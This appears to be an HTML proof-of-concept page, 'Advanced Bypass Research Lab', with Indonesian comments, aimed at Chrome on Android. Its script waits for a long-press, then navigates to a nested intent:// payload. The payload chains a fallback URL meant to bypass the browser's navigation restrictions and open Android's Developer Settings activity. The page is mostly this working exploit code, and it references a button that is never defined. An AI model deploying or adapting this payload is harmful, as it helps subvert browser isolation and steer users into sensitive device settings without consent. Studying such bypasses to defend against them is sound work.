    <div class="banner">Advanced Bypass Research Lab</div>

    <div class="container">
        <!-- Tombol Utama dengan Target Google.com di Atas & Rangkaian Payload di Bawah -->

    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
    <div class="footer-note">Target: Chromium Context Separation & Intent Scheme Chaining.</div>

    <script>
        let isExecuting = false;

        const triggerMasterVector = () => {
            if (isExecuting) return;
            isExecuting = true;

            const infoBox = document.getElementById("fileInfo");
            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing intent bypass parameters...`;

            // Jeda 2200ms memberikan waktu optimal bagi window manager Android untuk memisahkan panel atas (google.com)
            setTimeout(() => {
                try {
                    infoBox.innerHTML = `[+] Injecting chained intent payload...`;
                    
                    // Logika bypass diperkuat menggunakan skema ganda bersarang (Nested Intent & Fallback URL Encoding)
                    // Mengarahkan handler internal browser agar melompati proteksi pembatasan navigasi langsung
                    const targetPayload = "intent://#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.chrome;S.browser_fallback_url=intent://#Intent;component=com.android.settings/.Settings\$DevelopmentSettingsDashboardActivity;S.com.android.browser.application_id=com.android.chrome;end;end;";
                    
                    window.location.href = targetPayload;
                } catch (err) {
                    infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
                    console.debug("Bypass vector error:", err.message);
                } finally {
                    setTimeout(() => { isExecuting = false; }, 2000);
                }
            }, 2200);
        };

        const masterElement = document.getElementById("masterBtn");
        
        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
        masterElement.addEventListener("contextmenu", (e) => {
            triggerMasterVector();
        });
        
        masterElement.addEventListener("touchstart", () => {}, { passive: true });
    </script>
